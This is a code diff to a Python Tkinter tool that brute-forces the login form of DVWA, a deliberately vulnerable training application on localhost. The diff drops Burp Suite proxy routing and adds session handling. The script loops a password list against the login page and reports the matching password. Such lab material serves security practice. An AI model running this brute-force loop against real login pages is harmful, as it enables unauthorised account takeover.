@@ -4,10 +4,20 @@ import tkinter as tk
 # DVWA base URL (adjust as needed)
 DVWA_LOGIN_URL = "http://localhost/dvwa/login.php"
 DVWA_SECURITY_URL = "http://localhost/dvwa/security.php"
-PROXY_URL = "http://127.0.0.1:8080"  # Burp Suite proxy address
 
 # Function to change security level
-def change_security_level(security_level):
+def change_security_level(security_level, username, password):
+    # Prepare login data
+    login_data = {
+        'username': username,
+        'password': password,
+        'Login': 'Login'
+    }
+
+    # Send login request to obtain session cookies
+    session = requests.Session()
+    session.post(DVWA_LOGIN_URL, data=login_data)
+
     # Prepare data for the security level change request
     data = {
         'security': security_level,
@@ -15,7 +25,7 @@ def change_security_level(security_level):
     }
 
     # Send the request to change the security level directly to DVWA
-    response = requests.post(DVWA_SECURITY_URL, data=data)
+    response = session.post(DVWA_SECURITY_URL, data=data)
 
     # Check if the security level change was successful
     if f"Security level is now {security_level.capitalize()}" in response.text:
@@ -25,32 +35,20 @@ def change_security_level(security_level):
 
 # Function to perform brute force attack
 def perform_brute_force(username, password_list):
-    # Configure proxy settings for Burp Suite
-    proxies = {
-        'http': PROXY_URL,
-        'https': PROXY_URL
-    }
-
-    # Send the login request to DVWA through Burp Suite proxy
-    def send_login_request(password):
-        data = {
+    # Iterate through the password list
+    for password in password_list:
+        # Prepare login data
+        login_data = {
             'username': username,
             'password': password,
             'Login': 'Login'
         }
-        return requests.post(DVWA_LOGIN_URL, data=data, proxies=proxies)
 
-    # Get the selected security level
-    security_level = security_var.get()
+        # Send login request
+        response = requests.post(DVWA_LOGIN_URL, data=login_data)
 
-    # Iterate through the password list
-    for password in password_list:
-        response = send_login_request(password)
-
-        # Check if the login was successful based on the security level
-        if (security_level == "low" and "Welcome to the password protected area" in response.text) or \
-           (security_level == "medium" and "Welcome to the password protected area" in response.text and "Impossible" not in response.text) or \
-           (security_level == "high" and "Impossible" not in response.text):
+        # Check if the login was successful
+        if "Welcome to the password protected area" in response.text:
             result_label.config(text=f"Successful login! Password: {password}")
             return
 
@@ -58,7 +56,7 @@ def perform_brute_force(username, password_list):
 
 # TKinter GUI setup
 root = tk.Tk()
-root.title("Brute Force Attack with Burp Suite")
+root.title("Brute Force Attack without Burp Suite")
 
 # Username entry
 username_label = tk.Label(root, text="Username:")
@@ -85,7 +83,7 @@ security_option = tk.OptionMenu(root, security_var, "low", "medium", "high", "im
 security_option.grid(row=2, column=1, padx=10, pady=10)
 
 # Button to change security level
-change_security_button = tk.Button(root, text="Change Security Level", command=lambda: change_security_level(security_var.get()))
+change_security_button = tk.Button(root, text="Change Security Level", command=lambda: change_security_level(security_var.get(), username_entry.get(), password_entry.get()))
 change_security_button.grid(row=3, column=0, columnspan=2, padx=10, pady=10)
 
 # Button to trigger attack
